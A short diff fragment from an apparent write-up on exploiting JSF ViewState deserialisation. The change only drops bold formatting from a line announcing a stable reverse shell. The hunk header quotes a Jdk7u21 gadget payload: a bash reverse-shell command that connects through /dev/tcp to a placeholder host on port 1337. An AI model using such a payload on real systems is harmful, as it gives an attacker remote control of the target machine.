@@ -232,7 +232,7 @@ Jdk7u21 "/bin/bash -c /bin/bash${IFS}-i>&/dev/tcp/ipaddress/1337<&1"
   <img src="/images/deserialisation/descc25.png">
 </p>
 
-<p align="center"> Now we have reached stable **Reverse Shell** using **JSF Viewstate Deserialisation**.</p>
+<p align="center"> Now we have reached stable Reverse Shell using JSF Viewstate Deserialisation.</p>
 
 <p align="center">
   <img src="https://media.giphy.com/media/l0D76LT6o1jaG2g0M/source.gif">
